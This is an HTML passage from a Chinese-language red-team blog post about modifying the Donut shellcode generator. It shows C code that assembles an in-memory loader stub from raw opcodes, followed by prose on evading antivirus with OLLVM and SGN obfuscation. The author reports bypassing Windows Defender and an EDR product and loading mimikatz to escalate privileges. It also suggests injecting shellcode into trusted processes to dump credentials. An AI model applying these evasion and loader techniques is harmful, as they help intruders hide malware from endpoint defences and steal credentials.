DONUT_ERROR_NO_MEMORY;</span><br><span class="line">    &#125;</span><br><span class="line">    DPRINT(<span class="string">&quot;Inserting opcodes&quot;</span>);</span><br><span class="line">    <span class="comment">// insert shellcode</span></span><br><span class="line">    pl = (<span class="type">uint8_t</span>*)c-&gt;pic;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//构建一个加载器loader</span></span><br><span class="line">    <span class="comment">//    p1   ---&gt;  shellcode</span></span><br><span class="line">    <span class="comment">// call $ + c-&gt;inst_len</span></span><br><span class="line">    PUT_BYTE(pl,  <span class="number">0xE8</span>);</span><br><span class="line">    PUT_WORD(pl,  c-&gt;inst_len);</span><br><span class="line">    PUT_BYTES(pl, c-&gt;inst, c-&gt;inst_len);</span><br><span class="line">    <span class="comment">// pop ecx</span></span><br><span class="line">    PUT_BYTE(pl,  <span class="number">0x59</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// x86?</span></span><br><span class="line">    <span class="keyword">if</span>(c-&gt;arch == DONUT_ARCH_X86) &#123;</span><br><span class="line">      <span class="comment">// pop edx</span></span><br><span class="line">      PUT_BYTE(pl, <span class="number">0x5A</span>);</span><br><span class="line">      <span class="comment">// push ecx</span></span><br><span class="line">      PUT_BYTE(pl, <span class="number">0x51</span>);</span><br><span class="line">      <span class="comment">// push edx</span></span><br><span class="line">      PUT_BYTE(pl, <span class="number">0x52</span>);</span><br><span class="line">      </span><br><span class="line">      DPRINT(<span class="string">&quot;Copying %&quot;</span> PRIi32 <span class="string">&quot; bytes of x86 shellcode&quot;</span>, </span><br><span class="line">        (<span class="type">uint32_t</span>)<span class="keyword">sizeof</span>(LOADER_EXE_X86));</span><br><span class="line">        </span><br><span class="line">      PUT_BYTES(pl, LOADER_EXE_X86, <span class="keyword">sizeof</span>(LOADER_EXE_X86));</span><br><span class="line">    &#125; <span class="keyword">else</span> </span><br><span class="line">    <span class="comment">// AMD64?</span></span><br><span class="line">    <span class="keyword">if</span>(c-&gt;arch == DONUT_ARCH_X64) &#123;</span><br><span class="line">      </span><br><span class="line">      DPRINT(<span class="string">&quot;Copying %&quot;</span> PRIi32 <span class="string">&quot; bytes of amd64 shellcode&quot;</span>, </span><br><span class="line">        (<span class="type">uint32_t</span>)<span class="keyword">sizeof</span>(LOADER_EXE_X64));</span><br><span class="line"></span><br><span class="line">      <span class="comment">// ensure stack is 16-byte aligned for x64 for Microsoft x64 calling convention</span></span><br><span class="line">      </span><br><span class="line">      PUT_BYTES(pl, LOADER_EXE_X64_RSP_ALIGN, <span class="keyword">sizeof</span>(LOADER_EXE_X64_RSP_ALIGN));</span><br><span class="line">      PUT_BYTES(pl, LOADER_EXE_X64, <span class="keyword">sizeof</span>(LOADER_EXE_X64));</span><br><span class="line">    &#125; <span class="keyword">else</span> </span><br><span class="line">    <span class="comment">// x86 + AMD64?</span></span><br><span class="line">    <span class="keyword">if</span>(c-&gt;arch == DONUT_ARCH_X84) &#123;</span><br><span class="line">      </span><br><span class="line">      DPRINT(<span class="string">&quot;Copying %&quot;</span> PRIi32 <span class="string">&quot; bytes of x86 + amd64 shellcode&quot;</span>,</span><br><span class="line">        (<span class="type">uint32_t</span>)(<span class="keyword">sizeof</span>(LOADER_EXE_X86) + <span class="keyword">sizeof</span>(LOADER_EXE_X64)));</span><br><span class="line">        </span><br><span class="line">      <span class="comment">// xor eax, eax</span></span><br><span class="line">      PUT_BYTE(pl, <span class="number">0x31</span>);</span><br><span class="line">      PUT_BYTE(pl, <span class="number">0xC0</span>);</span><br><span class="line">      <span class="comment">// dec eax</span></span><br><span class="line">      PUT_BYTE(pl, <span class="number">0x48</span>);</span><br><span class="line">      <span class="comment">// js dword x86_code</span></span><br><span class="line">      PUT_BYTE(pl, <span class="number">0x0F</span>);</span><br><span class="line">      PUT_BYTE(pl, <span class="number">0x88</span>);</span><br><span class="line">      PUT_WORD(pl,  <span class="keyword">sizeof</span>(LOADER_EXE_X64_RSP_ALIGN) + <span class="keyword">sizeof</span>(LOADER_EXE_X64));</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// ensure stack is 16-byte aligned for x64 for Microsoft x64 calling convention</span></span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">      PUT_BYTES(pl, LOADER_EXE_X64_RSP_ALIGN, <span class="keyword">sizeof</span>(LOADER_EXE_X64_RSP_ALIGN));</span><br><span class="line">      PUT_BYTES(pl, LOADER_EXE_X64, <span class="keyword">sizeof</span>(LOADER_EXE_X64));</span><br><span class="line">      <span class="comment">// pop edx</span></span><br><span class="line">      PUT_BYTE(pl, <span class="number">0x5A</span>);</span><br><span class="line">      <span class="comment">// push ecx</span></span><br><span class="line">      PUT_BYTE(pl, <span class="number">0x51</span>);</span><br><span class="line">      <span class="comment">// push edx</span></span><br><span class="line">      PUT_BYTE(pl, <span class="number">0x52</span>);</span><br><span class="line">      PUT_BYTES(pl, LOADER_EXE_X86, <span class="keyword">sizeof</span>(LOADER_EXE_X86));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> DONUT_ERROR_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>loader部分也差不多 读取文件放入内存 处理加密&#x2F;混淆&#x2F;压缩等 处理托管和非托管的程序 解析导入表 重复重定位pe格式之类的 最后创建线程执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hThread = inst-&gt;api.CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)Start, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>

<p>原本是打算自己做静态免杀处理 后面发现代码实在太多 索性觉得用ollvm简单 后搜索到网上其他师傅的博客 用ollvm效果不错</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/13360">Donut生成的shellcode免杀-先知社区</a></p>
<p>因为代码里都是一些常规的代码 少部分调用申请内存 创建线程等需要动态规避 大部分时间做好静态规避效果就不错 后续也可以配合sgn再做一次静态混淆</p>
<p>这是原生编译的donut生成的效果</p>
<p><img src="/img/blog/11.png" alt="image-20251116234116094"></p>
<p>轻微的二开修改配合ollvm效果 静态基本完全规避了</p>
<p><img src="/img/blog/22.png" alt="image-20251116234116094"></p>
<p>在window defender下静态也可以绕过 动态也可以 可以看到成功加载了mimikatz而成功提权 没试过dump 这是我的物理机 但实际应该是dump不了的 可以配合一些新的dump技术用donut转成shellcode注入到高信任进程dump</p>
<p><img src="/img/blog/33.png" alt="image-20251116234116094"></p>
<p><img src="/img/blog/44.png" alt="image-20251116234116094"></p>
<p>实测国内某EDR效果和wd一样 但是一样dump不了 但可以用来加载一些非高敏感exe程序 配合内存保护技术可在EDR下加载一些安全工具</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://chao112122.github.io">cc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://chao112122.github.io/2025/11/16/donut/">https://chao112122.github.io/2025/11/16/donut/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://chao112122.github.io" target="_blank">Red Team, Malware Development, Code Auditing, Focused on Cybersecurity,C2 Developer,Security Researcher</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/123.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/11/12/mianshi/" title="面试经验"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">面试经验</div></div><div class="info-2"><div class="info-item-1">面试经验沥泉科技红队一面1.自我介绍及主要技术栈和熟悉的方向 2.如何信息收集? 3.了解过代码审计?说一下代码审计方面的 4.说一下java的各种协议以及如何利用 5.java的作用域 6.了解过php的代码审计? 7.说一下php的审计思路 8.php审计常见的漏洞函数 9,java的反序列化漏洞 这里问了都是关于java和php的代码审计相关的  因为已经很久没碰java安全了 基本全忘了…….代码审计也是很多之前审计的,….开局就一直懵……后面我主动提出 java安全和审计太久没接触忘记了…暂时跳过了这个话题 10.说一下Window的协议 11.域内怎么收集信息 12.在内网但不在域控内如何定位到域以及横向到域内 13.黄金和白银票据的区别 14,票据有哪些作用 15.你说你熟悉免杀是吧? 16.了解主流杀软吗 17.说一下常见杀软的绕过思路 18.核晶了解吗 怎么绕过核晶 19.白驱动攻击了解吗 原理是什么 20.白驱动攻击需要什么条件 21.核晶下怎么提权 22.说一下什么是apc 以及apc注入的原理 23.说一下反调试和反沙箱手法 24.有没有了解过一个前沿的免...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/123.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">cc</div><div class="author-info-description">Redteam</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/chao112122"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">feel free to contact me at my Google email: jiah3540@gmail.com</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Donut"><span class="toc-number">1.</span> <span class="toc-text">Donut</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%91%98%E8%A6%81%EF%BC%9A%E5%8A%A8%E6%9C%BA%E4%B8%8E%E6%88%90%E6%9E%9C"><span class="toc-number">1.1.</span> <span class="toc-text">摘要：动机与成果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Donut%E5%8F%82%E6%95%B0%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.2.</span> <span class="toc-text">Donut参数介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MODULE-OPTIONS-%E6%A8%A1%E5%9D%97%E9%80%89%E9%A1%B9"><span class="toc-number">1.2.1.</span> <span class="toc-text">MODULE OPTIONS (模块选项)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PIC-SHELLCODE-OPTIONS-Shellcode-%E9%80%89%E9%A1%B9"><span class="toc-number">1.2.2.</span> <span class="toc-text">PIC&#x2F;SHELLCODE OPTIONS (Shellcode 选项)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FILE-OPTIONS-%E6%96%87%E4%BB%B6%E9%80%89%E9%A1%B9"><span class="toc-number">1.2.3.</span> <span class="toc-text">FILE OPTIONS (文件选项)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXTRA-%E9%A2%9D%E5%A4%96%E9%80%89%E9%A1%B9"><span class="toc-number">1.2.4.</span> <span class="toc-text">EXTRA (额外选项)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%A0%81"><span class="toc-number">1.2.5.</span> <span class="toc-text">核心代码</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/16/donut/" title="Donut">Donut</a><time datetime="2025-11-16T11:39:47.638Z" title="发表于 2025-11-16 19:39:47">2025-11-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/12/mianshi/" title="面试经验">面试经验</a><time datetime="2025-11-12T01:29:39.303Z" title="发表于 2025-11-12 09:29:39">2025-11-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/08/c2_release/" title="c2框架release_v1版本">c2框架release_v1版本</a><time datetime="2025-10-08T06:40:18.048Z" title="发表于 2025-10-08 14:40:18">2025-10-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/25/code1/" title="记录一次代码审计">记录一次代码审计</a><time datetime="2025-09-24T23:12:46.220Z" title="发表于 2025-09-25 07:12:46">2025-09-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/25/dump/" title="全新视角下的 Java：一种全新的方式实现完美 dump lsass">全新视角下的 Java：一种全新的方式实现完美 dump lsass</a><time datetime="2025-09-24T23:11:29.825Z" title="发表于 2025-09-25 07:11:29">2025-09-25</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By cc</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>